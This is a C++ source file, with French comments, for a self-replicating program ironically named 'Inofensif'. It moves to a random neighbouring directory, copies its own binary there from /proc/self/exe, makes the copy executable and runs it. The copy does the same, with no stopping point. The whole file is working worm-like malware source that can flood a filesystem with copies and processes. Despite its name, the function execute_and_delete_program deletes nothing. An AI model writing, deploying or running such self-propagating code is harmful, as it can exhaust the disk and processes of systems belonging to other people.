/*
	COMPILATION:

	mode debug:
		clang++ -DDEBUG -g3 -fsanitize=leak -fsanitize=address main.cpp

	mode discret:
		clang++ main.cpp
*/
#include <iostream>
#include <filesystem>
#include <random>
#include <fstream>
#include <vector>
#include <unistd.h>
#include <sys/wait.h>

enum class Movement
{
	Avance,
	Recule,
	Immobile
};

class	Inofensif
{
	private:
		#ifdef DEBUG
			const bool				debug = 1;
		#else
			const bool				debug = 0;
		#endif
		const std::filesystem::path			position;
		const Movement					movement;
		std::vector<std::filesystem::path>		vector_path;
		const std::filesystem::path			dir_target;
		std::filesystem::path			clone_path; 
		
		Movement	choisirMovementAleatoire(void)
		{
			static std::random_device rd;
			static std::mt19937 gen(rd());
			static std::uniform_int_distribution<> distrib(0, 2);
			return static_cast<Movement>(distrib(gen));
		}
		
		std::filesystem::path		choisirRepertoireAleatoire(void)
		{
			static std::random_device rd;
			static std::mt19937 gen(rd());
			static std::uniform_int_distribution<> distrib(0, vector_path.size() - 1);
			return vector_path.at(distrib(gen));
		}

		void	list_directory_to_vector_path(std::filesystem::path where)
		{
			
			for (auto& entry : std::filesystem::directory_iterator(where))
			{
				if (std::filesystem::is_directory(entry))
				{
					 vector_path.push_back(entry.path());
					if (debug)
						std::cout << "directory_element[" << vector_path.size() - 1 << "] = " << vector_path.back() << std::endl;
				}
			}
			if (debug)
				std::cout << "il y a " << vector_path.size() << " repertoire." << std::endl;
		}

		std::filesystem::path	get_dir_target(void)
		{
			std::filesystem::path	target;
			if (debug)
				announce();
			switch(movement)
			{
				case (Movement::Avance):
					if (debug)
						std::cout << "j'avance" << std::endl;
					list_directory_to_vector_path(position);
					target = choisirRepertoireAleatoire();
					break;
				case (Movement::Recule):
					if (debug)
						std::cout << "je recule" << std::endl;
					target = position.parent_path();
					break;
				default:
					if (debug)	
						std::cout << "je reste ici" << std::endl;
					target = position;
					break;

			}
			return target;
		}

		void	announce(void)
		{
			std::cout << "-----------------------------INO------------------------------" << std::endl << "position actuel: " << position << std::endl;
			
		}


		void	clone_itself(void)
		{
			char			buffer[4000];
			clone_path = dir_target / "clone";
			std::ofstream		clone(clone_path);
			std::ifstream		itself("/proc/self/exe");
			if (debug)
			{
				std::cout << "clone FILE_OPEN: " << clone.is_open() << std::endl;
				std::cout << "itself FILE_OPEN: " << itself.is_open() << std::endl;
			}
			do
			{
				itself.read(buffer, sizeof(buffer));
				clone.write(buffer, itself.gcount());
			} while((itself.rdstate() & std::ifstream::eofbit) == 0);
			std::filesystem::permissions(clone_path, 
				std::filesystem::perms::owner_all | std::filesystem::perms::group_all,
				std::filesystem::perm_options::add);
			if (debug)
				std::cout << "clone created" << std::endl;
			itself.close();
			clone.close();
		}
		void	execute_and_delete_program(void)
		{
			const	pid_t pid = fork();
			if (debug)
				std::cout << "PID = " << pid << std::endl;
			if (pid == 0)
			{
				if (debug)
					std::cout << "clone path: " << clone_path << std::endl;
				execve(clone_path, NULL, NULL);
			}
			wait(NULL);
			
		}

	public:
		Inofensif(void): position(std::filesystem::current_path()),
					movement(choisirMovementAleatoire()),
					dir_target(get_dir_target())
		{
			if (debug)
				std::cout << "le repertoire cible est:___________" << dir_target << std::endl;
			clone_itself();
			execute_and_delete_program();
		}
};


int	main(void)
{
	Inofensif ino;
	return 0;
}
